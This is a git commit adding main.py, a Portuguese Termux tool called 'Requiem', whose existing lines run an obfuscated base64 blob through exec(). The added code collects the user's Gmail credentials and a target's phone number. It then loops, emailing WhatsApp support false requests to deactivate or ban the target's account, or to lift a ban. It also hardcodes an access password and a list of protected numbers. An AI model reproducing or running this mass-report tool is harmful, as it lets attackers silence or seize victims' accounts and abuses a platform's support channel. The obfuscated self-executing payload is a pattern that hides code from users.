00b05e6b54fa6333ff3147e5393fa30fed718c1f
gpdkiller182 <83891308+gpdkiller182@users.noreply.github.com>
2021-06-28 20:10:40 -0300

    Update main.py

--- main.py
+++ main.py
@@ -37,3 +37,208 @@ except:
 b = (base64.b64decode('''aW1wb3J0IG1hcnNoYWwsIHpsaWIsIG9zLCBzeXMKIyBzbGEgc2UgYmFzZTY0IHZlbSBwcsOpLWluc3RhbGFkYSwgbG1mYW8KIyBTY3JpcHQgTmFtZTogUmVxdWllbQojIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzMuNS9saWJyYXJ5L3NtdHBsaWIuaHRtbCAKIyBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vYS8yNzUxNTgzMy8yNjg0MzA0CiMgQSBzaW1wbGUgUHl0aG9uIHByb2dyYW0gdG8gZGVtb25zdHJhdGUgCiMgZ2V0cGFzcy5nZXRwYXNzKCkgdG8gcmVhZCBzZWN1cml0eSBxdWVzdGlvbgp0cnk6CglpbXBvcnQgYmFzZTY0CmV4Y2VwdDoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgYmFzZTY0IikKCWltcG9ydCBiYXNlNjQKYSA9IChiYXNlNjQuYjY0ZGVjb2RlKCcnJ0l5RXZkWE55TDJKcGJpOWxibllnY0hsMGFHOXVDaU1nTFMwZ1kyOWthVzVuT2lCMWRHWXRPQ0F0TFFwbmJHOWlZV3dnVWl4Q0xFTXNXU3hITEZKVUxFTlpMRU5QQ2tOUFBTZGNNRE16VzIwbk8xSTlKMXd3TXpOYk1Uc3pNVzBuTzBJOUoxd3dNek5iTVRzek5HMG5PME05SjF3d016TmJNVHN6TjIwbk8wTlpQU2RjTURNeld6RTdNelp0Snp0WlBTZGNNRE16V3pFN016TnRKenRIUFNkY01ETXpXekU3TXpKdEp6dFNWRDBuWERBek0xczdNRzBuTzA1UFgwWlBVazFCVkQwaVhEQXpNMXN3YlNJN1ExOUhVa1ZaT0RrOUlsd3dNek5iTXpnN05Uc3lOVFJ0SWp0RFgxSkZSREU5SWx3d016TmJORGc3TlRzeE9UWnRJZ3BwYlhCdmNuUWdjMjEwY0d4cFlpd2diM01zSUhONWN5d2dkR2x0WlN3Z2MzTnNMQ0JuWlhSd1lYTnpDbVJsWmlCc2FXNXJLQ2s2Q2dsdmN5NXplWE4wWlcwb0luUmxjbTExZUMxdmNHVnVMWFZ5YkNCb2RIUndjem92TDIxNVlXTmpiM1Z1ZEM1bmIyOW5iR1V1WTI5dEwyeGxjM056WldOMWNtVmhjSEJ6UDNCc2FUMHhKbkpoY0hROVFVVnFTRXcwVDFObloycFpUMmQwT0djNFNHSm5VMVUxT0V4d1ZYRlJOVWR6UkRZemFYQkZUbkZoT0RSWlpXZE5TR2x2Ym5GeGRrbFlUVTF2WXpSaWNYVXRRekJIU0RCT0xTMUxZV3hmUVVad1pEVnlVa3BaZVU4d1p5MTVNVUZpUlZFaUtRb0taR1ZtSUhKbGMzUmhjblFvS1RvS0lDQWdJSEI1ZEdodmJpQTlJSE41Y3k1bGVHVmpkWFJoWW14bE8yOXpMbVY0WldOc0tIQjVkR2h2Yml3Z2NIbDBhRzl1TENBcWMzbHpMbUZ5WjNZcENncGtaV1lnWTJ4bFlYSW9LVG9LQ1c5ekxuTjVjM1JsYlNnaVkyeGxZWElpS1FvS1kyeGxZWElvS1FwMGNuazZDZ2xwYlhCdmNuUWdjSGxtYVdkc1pYUUtaWGhqWlhCME9nb0piM011YzNsemRHVnRLQ0p3YVhBZ2FXNXpkR0ZzYkNCd2VXWnBaMnhsZENJcE8zSmxjM1JoY25Rb0tRb0tjbVZ6ZFd4MElEMGdjSGxtYVdkc1pYUXVabWxuYkdWMFgyWnZjbTFoZENnaVVpQmxJSEVnZFNCcElHVWdiU0lzSUdadmJuUWdQU0FpWTI5emJXbGpJaUFwQ25CeWFXNTBLR1luSnlkN1EzMTdSMzE3Y21WemRXeDBmWHREZlNjbkp5a0tjQ0E5SUdsdWNIVjBLR1luZTBOOVczdEhmU0Y3UTMxZElFUnBaMmwwWlNCaElGTmxibWhoT2lBbktRcHBaaUJ3SUQwOUlDYzNZVE5EWVcxd2IzTW5PZ29nSUNBZ2NISnBiblFvWmlkN1EzMWJlMGQ5S250RGZWMGdRV05sYzNOdklFeHBZbVZ5WVdSdkp5azdjR0Z6Y3dwbGJITmxPZ29nSUNBZ2NISnBiblFvWmlkN1EzMWJlMUo5S250RGZWMGdVMlZ1YUdFZ1NXNWpiM0p5WlhSaEp5azdkR2x0WlM1emJHVmxjQ2d5S1R0eVpYTjBZWEowS0NrS0NRb0tZbXh2WTJ0ZmJuVnRJRDBnV3lJck5UVWdNakVnTnpreE9DMHdOVE16SWl3aUt6VTFJREl4SURjNU1UZ3dOVE16SWl3aU5UVWdNakVnTnpreE9EQTFNek16TXlJc0lqVTFJREl4SURjNU1UZ3RNRFV6TXlJc0lpczFOVEl4TnpreE9DMHdOVE16SWl3aUt6VTFNakUzT1RFNE1EVXpNeUlzSWpVMU1qRTNPVEU0TURVek15SXNJalUxTWpFM09URTRMVEExTXpNaVhRb0taR1ZtSUdsdWFYUW9LVG9LQ1hSeWVUb0tDUWwzYUdsc1pTQlVjblZsT2dvSkNRbG1iM0lnYm5WdElHbHVJR0pzYjJOclgyNTFiVG9LQ1FrSkNXbG1JRzUxYlNCcGJpQnVkVzFsY204NkNna0pDUWtKY0hKcGJuUW9aaWRjYm50RGZWdDdVbjBoZTBOOVhTQk93NXBOUlZKUElGQlNUMGxDU1VSUExpY3BPM1JwYldVdWMyeGxaWEFvTXlrN2NtVnpkR0Z5ZENncENna0pDWEJ2Y25RZ1BTQTBOalVLQ1FrSmMyMTBjRjl6WlhKMlpYSWdQU0FpYzIxMGNDNW5iV0ZwYkM1amIyMGlDZ2tKQ1hObGJtUmxjbDlsYldGcGJDQTlJQ0o3ZlNJdVptOXliV0YwS0dWdFlXbHNLUW9KQ1FseVpXTmxhWFpsY2w5bGJXRnBiQ0E5SUNKemRYQndiM0owUUhOMWNIQnZjblF1ZDJoaGRITmhjSEF1WTI5dElnb0pDUWxqYjI1MFpYaDBJRDBnYzNOc0xtTnlaV0YwWlY5a1pXWmhkV3gwWDJOdmJuUmxlSFFvS1FvSkNRbDNhWFJvSUhOdGRIQnNhV0l1VTAxVVVGOVRVMHdvYzIxMGNGOXpaWEoyWlhJc0lIQnZjblFzSUFrSkNXTnZiblJsZUhROVkyOXVkR1Y0ZENrZ1lYTWdjMlZ5ZG1WeU9nb0pDUWtnQ1hObGNuWmxjaTVzYjJkcGJpaHpaVzVrWlhKZlpXMWhhV3dzSUhCaGMzTjNiM0prS1FvSkNRa2dDWE5sY25abGNpNXpaVzVrYldGcGJDaHpaVzVrWlhKZlpXMWhhV3dzSUhKbFkyVnBkbVZ5WDJWdFlXbHNMQ0J0WlhOellXZGxLUW9KWlhoalpYQjBPZ29KQ1hCeWFXNTBLR1lpZTBOOVczdFNmVVZTVWs5U2UwTjlYU0JRWlhKdGFYTnpZVzhnYm1GdklHZGhjbUZ1ZEdsa1lTQnZkU0J6Wlc1b1lTQmxJR1Z0WVdsc0lHbHVkbUZzYVdSdktITXBMaUlwTzNScGJXVXVjMnhsWlhBb05TazdjR0Z6Y3dvS1UyRnBjaUE5SUZSeWRXVUtkMmhwYkdVb1UyRnBjaUE5UFNCVWNuVmxLVG9LQ1dOc1pXRnlLQ2s3Y0hKcGJuUW9aaWNuSjN0RGZYdEhmUXA3Y21WemRXeDBmUW91TGk1Z0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdMaXR6Y3lzdkwyOXpjenBnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JnT205NUt5MGdJQ0FnSUNBZ1lEcHpjeXN1Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmdMM056TDJBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzF2ZVc4dENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXRLM2x2T2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHQXZlWE12WUFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JnT25ONUt5NGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmdPbk41S3k0S0lDQWdJQ0FnSUNBZ0lDQWdZQzl6Y3k5Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUMwcmVXOHJDaUFnSUNBZ0lDQWdJQ0FnTFdndklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F1ZVhOZ0NpQWdJQ0FnSUNBZ0lDQmdiUzBnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0xTdHpjMlJ2Q2lBZ0lDQWdJQ0FnSUNBdFpDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdPbk5rVGs1T1RrNWtDaUFnSUNBZ0lDQWdJQ0E2WkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JnTDNsdFRrNU9UazVPVGs1a0NpQWdJQ0FnSUNBZ0lDQTZaQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBdUsyaE9UazVPVGs1T1RrNU9UazVrQ2lBZ0lDQWdJQ0FnSUNBNlpDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXRiMlJPVGs1T1RrNU9UazVPVGs1T1RrNWtDaUFnSUNBZ0lDQWdJQ0E2WkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E2YzJST1RrNU9UazVPVGs1T1RrNU9UazVPVGs1a0NpQWdJQ0FnSUNBZ0lDQTZaQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0syMU9UazVPVGs1T1RrNU9UazVPVGs1T1RrNU9UazVrQ2lBZ0lDQWdJQ0FnSUNBNlpDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J6VGs1T1RrNU9UazVPVGs1T1RrNU9UazVPVGs1T1RrNWtDaUFnSUNBZ0lDQWdJQ0E2WkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm9UazVPVGs1NVlIbDVUazVPVGs1T1RrNU9UazVPVGs1a0NpQWdJQ0FnSUNBZ0lDQTZaQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCb1RrNU9UbWd0TGpwelRrNU9UazVPVGs1T1RrNU9UazVrQ2lBZ0lDQWdJQ0FnSUNBNlpDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JvVGs1T2FHQXJUazVPVGs1T1RrNU9UazVPVGs1T1RrNWtDaUFnSUNBZ0lDQWdJQ0F0WkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm9UazVPZVNBZ1lDNHZiVTVPVGs1T1RrNU9UazVPVGs1a0NpQWdJQ0FnSUNBZ0lDQmdiUzRnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCb1RrNU9UbVI1ZVMwZ1pFNU9UazVPYUcxT1RrNU9UazV6Q2lBZ0lDQWdJQ0FnSUNBZ09tUTZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JvVGs1T1RrNXRhQzR2VGs1dGVTOHRLMjFPVGs1T1RubGdDaUFnSUNBZ0lDQWdJQ0FnSUdBcmVYTTZZQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm9UazVPYUdCZ0lIbE9UazV2YjJST1RrNU9UbTE1T2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JnTDNsNUx5NGdJQ0FnSUNBZ0lDQWdJQ0FnYUU1T1RrNXRhQzl0VGs1T1RrNU9UazVrYnkwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1lEcHplVzh0SUNBZ0lDQWdJQ0FnSUdoT1RrNU9UazVPVGs1T1RrNU9hQ3N1Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXVLM2x6T21BZ0lDQWdJQ0JvVGs1T1RrNU9UazVPYlhNdllBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1lDOXplU3N1SUNBZ2VVNU9UazVPVG1SdkxRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzF2ZVc4dksyMU9iWGt2TGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR0F0T2pvNkNudERmVnh1ZTBOOWUwZDlRMjlrWldRZ1FuazZlME45SUV0cGJubGNibnREZlZ0N1VuMHFlME45WFNCQmRHbDJaU0JoSUhCbGNtMXBjM1BEbzI4Z1pHVWdZbUZwZUdFZ2MyVm5kWEpoYnNPbllTQmxJSFYwYVd4cGVtVWdkVzBnWlcxaGFXd2djRzl5SUdGMFlYRjFaU2h5WldOdmJXVnVaR0hEcDhPamJ5a3VKeWNuS1R0c2FXNXJLQ2s3YjNBZ1BTQnBibkIxZENobUlseHVlME45ZTFsOVR5ZHhkV1VnWkdWelpXcGhJR1poZW1WeVAzdERmVnh1ZTBOOVczdEhmVEY3UTMxZElFUmxjMkYwYVhaaGNpQk9kVzFsY205Y2JudERmVnQ3UjMweWUwTjlYU0JTWlhScGNtRnlJR1J2SUVOdmJuUmhaRzl5WEc1N1EzMWJlMGQ5TTN0RGZWMGdVbVYwYVhKaGNpQkNZVzVwYldWdWRHOWNibnREZlZ0N1IzMDBlME45WFNCQ1lXNXBjaUJPZFcxbGNtOTdRMzFjYm50RGZWdDdVbjB3ZTBOOVhTQlRZV2x5WEc1N1EzMWJlMGQ5UkdsbmFYUmxJR0VnYjNERHA4T2piM3REZlYwNklDSXBDZ2xwWmlCdmNDQTlQU0FuTVNjNkNna0paVzFoYVd3Z1BTQnBibkIxZENobUozdERmVnQ3V1gxSGJXRnBiSHREZlYwNklDY3BPM0JoYzNOM2IzSmtJRDBnYVc1d2RYUW9aaWQ3UTMxYmUxbDlVMlZ1YUdFZ0tFN0RvMjhnYzJVZ2NISmxiMk4xY0dVc0lHN0RvMjhnZEdWdGIzTWdZV05sYzNOdklNT2dJSE4xWVNCelpXNW9ZU2w3UTMxZE9pQW5LVHR1ZFcxbGNtOGdQU0JwYm5CMWRDaG1KM3REZlZ0N1dYMU9kVzFsY204Z1pHOGdRV3gyYnlBb1pYZzZJRFUxSURJeElEa3FLaW9xS1h0RGZWMDZJQ2NwQ2drSmJXVnpjMkZuWlNBOUlDSWlJbHdLVTNWaWFtVmpkRG9nUkdWellYUnBkbVVnWlhOMFpTQnVkVzFsY204S0NrUmxjMkYwYVhabElHVnpkR0VnWTI5dWRHRWdkWEpuWlc1MFpXMWxiblJsT2lCN2ZTSWlJaTVtYjNKdFlYUW9iblZ0WlhKdktRb0pDWEJ5YVc1MEtHWW5lME45ZTFKOVJHVnpZWFJwZG1GdVpHOGdUc082YldWeWJ5RjdRMzFjYmxWelpTQjdRMzE3VW4xRFZGSk1JRU43UTMwZ2NHRnlZU0J3WVhKaGNpQnZJSE5qY21sd2RDQmxJSHREZlh0SGZYQjVkR2h2YmpNZ2JXRnBiaTV3ZVh0RGZTQndZWEpoSUhKbGFXNXBZMmxoY2k0bktUdHBibWwwS0NrS0NnbGxiR2xtSUc5d0lEMDlJQ2N5SnpvS0NRbGxiV0ZwYkNBOUlHbHVjSFYwS0dZbmUwTjlXM3RaZlVkdFlXbHNlME45WFRvZ0p5azdjR0Z6YzNkdmNtUWdQU0JwYm5CMWRDaG1KM3REZlZ0N1dYMVRaVzVvWVNBb1RzT2pieUJ6WlNCd2NtVnZZM1Z3WlN3Z2JzT2pieUIwWlcxdmN5QmhZMlZ6YzI4Z3c2QWdjM1ZoSUhObGJtaGhLWHREZlYwNklDY3BPMjUxYldWeWJ5QTlJR2x1Y0hWMEtHWW5lME45VzN0WmZVNTFiV1Z5YnlCa2J5QkJiSFp2SUNobGVEb2dOVFVnTWpFZ09Tb3FLaW9wZTBOOVhUb2dKeWtLQ1FsdFpYTnpZV2RsSUQwZ0lpSWlYQXBUZFdKcVpXTjBPaUJTWldWdWRtbGhjaUJqYjJScFoyOGdaR1VnZG1WeWFXWnBZMkZqWVc4S0NrOXNZU3dnYm1GdklHTnZibk5wWjI4Z2JXVWdjbVZuYVhOMGNtRnlJRzVoSUcxcGJtaGhJR052Ym5SaExDQnRaU0JoYW5Wa1pXMDZJSHQ5SWlJaUxtWnZjbTFoZENodWRXMWxjbThwQ2drSmNISnBiblFvWmlkN1EzMTdSMzFVYVhKaGJtUnZJR1J2SUVOdmJuUmhaRzl5SVh0RGZWeHVWWE5sSUh0RGZYdFNmVU5VVWt3Z1EzdERmU0J3WVhKaElIQmhjbUZ5SUc4Z2MyTnlhWEIwSUdVZ2UwTjllMGQ5Y0hsMGFHOXVNeUJ0WVdsdUxuQjVlME45SUhCaGNtRWdjbVZwYm1samFXRnlMaWNwTzJsdWFYUW9LUW9LQ1dWc2FXWWdiM0FnUFQwZ0p6TW5PZ29KQ1dWdFlXbHNJRDBnYVc1d2RYUW9aaWQ3UTMxYmUxbDlSMjFoYVd4N1EzMWRPaUFuS1R0d1lYTnpkMjl5WkNBOUlHbHVjSFYwS0dZbmUwTjlXM3RaZlZObGJtaGhJQ2hPdzZOdklITmxJSEJ5Wlc5amRYQmxMQ0J1dzZOdklIUmxiVzl6SUdGalpYTnpieUREb0NCemRXRWdjMlZ1YUdFcGUwTjlYVG9nSnlrN2JuVnRaWEp2SUQwZ2FXNXdkWFFvWmlkN1EzMWJlMWw5VG5WdFpYSnZJR1J2SUVGc2RtOGdLR1Y0T2lBMU5TQXlNU0E1S2lvcUtpbDdRMzFkT2lBbktRb0pDVzFsYzNOaFoyVWdQU0FpSWlKY0NsTjFZbXBsWTNRNklFNTFiV1Z5YnlCaVlXNXBaRzhLQ2sxbGRTQnVkVzFsY204Z1ptOXBJR0poYm1sa2J5QnBibVJsZG1sa1lXMWxiblJsTENCcGMzUnZJR1p2YVNCMWJTQmxibWRoYm04dUlFWjFhU0JsYm1kaGJtRmtieUJsSUhKdmRXSmhjbUZ0SUcxbGRTQnVkVzFsY204c0lIQnlaV05wYzI4Z1lYUnBkbUZ5SUcxcGJtaGhJR052Ym5SaExDQndiMmx6SUhSbGJtaHZJSFZ0WVNCbGJYQnlaWE5oSUdVZ2RHVnVhRzhnY0dWa2FXUnZjeUJ3Wlc1a1pXNTBaWE02SUh0OUlpSWlMbVp2Y20xaGRDaHVkVzFsY204cENna0pjSEpwYm5Rb1ppZDdRMzE3UjMxU1pYUnBjbUZ1Wkc4Z1FtRnVhVzFsYm5SdklYdERmVnh1VlhObElIdERmWHRTZlVOVVVrd2dRM3REZlNCd1lYSmhJSEJoY21GeUlHOGdjMk55YVhCMElHVWdlME45ZTBkOWNIbDBhRzl1TXlCdFlXbHVMbkI1ZTBOOUlIQmhjbUVnY21WcGJtbGphV0Z5TGljcE8ybHVhWFFvS1FvS0NXVnNhV1lnYjNBZ1BUMGdKelFuT2dvSkNXVnRZV2xzSUQwZ2FXNXdkWFFvWmlkN1EzMWJlMWw5UjIxaGFXeDdRMzFkT2lBbktUdHdZWE56ZDI5eVpDQTlJR2x1Y0hWMEtHWW5lME45VzN0WmZWTmxibWhoSUNoT3c2TnZJSE5sSUhCeVpXOWpkWEJsTENCdXc2TnZJSFJsYlc5eklHRmpaWE56YnlERG9DQnpkV0VnYzJWdWFHRXBlME45WFRvZ0p5azdiblZ0WlhKdklEMGdhVzV3ZFhRb1ppZDdRMzFiZTFsOVRuVnRaWEp2SUdSdklFRnNkbThnS0dWNE9pQTFOU0F5TVNBNUtpb3FLaWw3UTMxZE9pQW5LUW9KQ1cxbGMzTmhaMlVnUFNBaUlpSmNDbE4xWW1wbFkzUTZJRVpoWTJGdElHOGdZbUZ1YVcxbGJuUnZJR1J2SUcxbGRTQnVkVzFsY204S0NrWmhkbTl5SUdKaGJtbHlJRzFsZFNCdWRXMWxjbTg2SUh0OUlpSWlMbVp2Y20xaGRDaHVkVzFsY204cENna0pjSEpwYm5Rb1ppZDdRMzE3VW4xQ1lXNXBibVJ2SVh0RGZWeHVWWE5sSUh0RGZYdFNmVU5VVWt3Z1EzdERmU0J3WVhKaElIQmhjbUZ5SUc4Z2MyTnlhWEIwSUdVZ2UwTjllMGQ5Y0hsMGFHOXVNeUJ0WVdsdUxuQjVlME45SUhCaGNtRWdjbVZwYm1samFXRnlMaWNwTzJsdWFYUW9LUW9LQ1dWc2FXWWdiM0FnUFQwZ0p6QW5PZ29KQ1ZOaGFYSWdQU0JHWVd4elpRcHZjeTV6ZVhOMFpXMG9KM0p0SUMxeVppQmZYM0I1WTJGamFHVmZYeWNwQ25CeWFXNTBLR1luVzN0RGZYdFNmU3Q3UTMxZElGdDdRMzE3VW4xQmNuSnBkbVZrWlhKamFYdERmVjBuS1E9PScnJykpCmV4ZWMoYSk='''))
 
 exec(b)
+#!/usr/bin/env python
+
+# -- coding: utf-8 --
+
+global R,B,C,Y,G,RT,CY,CO
+
+CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
+
+import smtplib, os, sys, time, ssl, getpass
+
+def link():
+
+	os.system("termux-open-url https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ")
+
+def restart():
+
+    python = sys.executable;os.execl(python, python, *sys.argv)
+
+def clear():
+
+	os.system("clear")
+
+clear()
+
+try:
+
+	import pyfiglet
+
+except:
+
+	os.system("pip install pyfiglet");restart()
+
+result = pyfiglet.figlet_format("R e q u i e m", font = "cosmic" )
+
+print(f'''{C}{G}{result}{C}''')
+
+p = input(f'{C}[{G}!{C}] Digite a Senha: ')
+
+if p == '7a3Campos':
+
+    print(f'{C}[{G}*{C}] Acesso Liberado');pass
+
+else:
+
+    print(f'{C}[{R}*{C}] Senha Incorreta');time.sleep(2);restart()
+
+	
+
+block_num = ["+55 21 7918-0533","+55 21 79180533","55 21 7918053333","55 21 7918-0533","+55217918-0533","+552179180533","552179180533","55217918-0533"]
+
+def init():
+
+	try:
+
+		while True:
+
+			for num in block_num:
+
+				if num in numero:
+
+					print(f'\n{C}[{R}!{C}] NÚMERO PROIBIDO.');time.sleep(3);restart()
+
+			port = 465
+
+			smtp_server = "smtp.gmail.com"
+
+			sender_email = "{}".format(email)
+
+			receiver_email = "support@support.whatsapp.com"
+
+			context = ssl.create_default_context()
+
+			with smtplib.SMTP_SSL(smtp_server, port, 			context=context) as server:
+
+			 	server.login(sender_email, password)
+
+			 	server.sendmail(sender_email, receiver_email, message)
+
+	except:
+
+		print(f"{C}[{R}ERROR{C}] Permissao nao garantida ou senha e email invalido(s).");time.sleep(5);pass
+
+Sair = True
+
+while(Sair == True):
+
+	clear();print(f'''{C}{G}
+
+{result}
+
+...`
+
+                             .+ss+//oss:`
+
+                         `:oy+-       `:ss+.
+
+                      `/ss/`              -oyo-
+
+                   -+yo:                     `/ys/`
+
+               `:sy+.                           `:sy+.
+
+            `/ss/`                                  -+yo+
+
+           -h/                                         .ys`
+
+          `m-                                        -+ssdo
+
+          -d                                      :sdNNNNNd
+
+          :d                                  `/ymNNNNNNNNd
+
+          :d                               .+hNNNNNNNNNNNNd
+
+          :d                            -odNNNNNNNNNNNNNNNd
+
+          :d                         :sdNNNNNNNNNNNNNNNNNNd
+
+          :d                       +mNNNNNNNNNNNNNNNNNNNNNd
+
+          :d                      sNNNNNNNNNNNNNNNNNNNNNNNd
+
+          :d                      hNNNNNy`yyNNNNNNNNNNNNNNd
+
+          :d                      hNNNNh-.:sNNNNNNNNNNNNNNd
+
+          :d                      hNNNh`+NNNNNNNNNNNNNNNNNd
+
+          -d                      hNNNy  `./mNNNNNNNNNNNNNd
+
+          `m.                     hNNNNdyy- dNNNNNhmNNNNNNs
+
+           :d:                    hNNNNNmh./NNmy/-+mNNNNNy`
+
+            `+ys:`                hNNNh`` yNNNoodNNNNNmy:
+
+               `/yy/.             hNNNNmh/mNNNNNNNNdo-
+
+                  `:syo-          hNNNNNNNNNNNNNh+.
+
+                      .+ys:`      hNNNNNNNNNms/`
+
+                         `/sy+.   yNNNNNNdo-
+
+                             -oyo/+mNmy/.
+
+                                `-:::
+
+{C}\n{C}{G}Coded By:{C} Kiny\n{C}[{R}*{C}] Ative a permissão de baixa segurança e utilize um email por ataque(recomendação).''');link();op = input(f"\n{C}{Y}O'que deseja fazer?{C}\n{C}[{G}1{C}] Desativar Numero\n{C}[{G}2{C}] Retirar do Contador\n{C}[{G}3{C}] Retirar Banimento\n{C}[{G}4{C}] Banir Numero{C}\n{C}[{R}0{C}] Sair\n{C}[{G}Digite a opção{C}]: ")
+
+	if op == '1':
+
+		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
+
+		message = """\
+
+Subject: Desative este numero
+
+Desative esta conta urgentemente: {}""".format(numero)
+
+		print(f'{C}{R}Desativando Número!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()
+
+	elif op == '2':
+
+		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
+
+		message = """\
+
+Subject: Reenviar codigo de verificacao
+
+Ola, nao consigo me registrar na minha conta, me ajudem: {}""".format(numero)
+
+		print(f'{C}{G}Tirando do Contador!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()
+
+	elif op == '3':
+
+		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
+
+		message = """\
+
+Subject: Numero banido
+
+Meu numero foi banido indevidamente, isto foi um engano. Fui enganado e roubaram meu numero, preciso ativar minha conta, pois tenho uma empresa e tenho pedidos pendentes: {}""".format(numero)
+
+		print(f'{C}{G}Retirando Banimento!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()
+
+	elif op == '4':
+
+		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
+
+		message = """\
+
+Subject: Facam o banimento do meu numero
+
+Favor banir meu numero: {}""".format(numero)
+
+		print(f'{C}{R}Banindo!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()
+
+	elif op == '0':
+
+		Sair = False
+
+os.system('rm -rf __pycache__')
+
+print(f'[{C}{R}+{C}] [{C}{R}Arrivederci{C}]')
